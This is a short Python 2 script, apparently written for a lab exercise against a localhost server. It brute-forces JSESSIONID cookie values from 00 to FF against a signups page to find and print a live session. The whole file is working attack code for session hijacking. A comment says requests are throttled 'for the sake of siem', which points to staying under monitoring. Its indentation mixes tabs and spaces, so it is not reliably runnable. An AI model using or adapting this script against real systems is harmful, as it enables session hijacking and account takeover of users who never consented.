import requests
import time

url = "http://localhost:8080/signups.html"

for i in range(0, 256):
    cookieValue = format(i, '02X')
    header = {'Cookie': 'JSESSIONID=%s;' % cookieValue}
    print header
    
    response = requests.get(url, headers=header)        
    
    if response.status_code == 200:
        # Normal response.content is 452, so more than that, there should be
	# something there!
	print len(response.content)
		
        if (len(response.content) > 452):
	    print "Found open session with JSESSIONID Cookie %s" % cookieValue
	    print response.content
	    break
	# some trottle for the sake of siem...	
	time.sleep(0.1)
print "End of script"

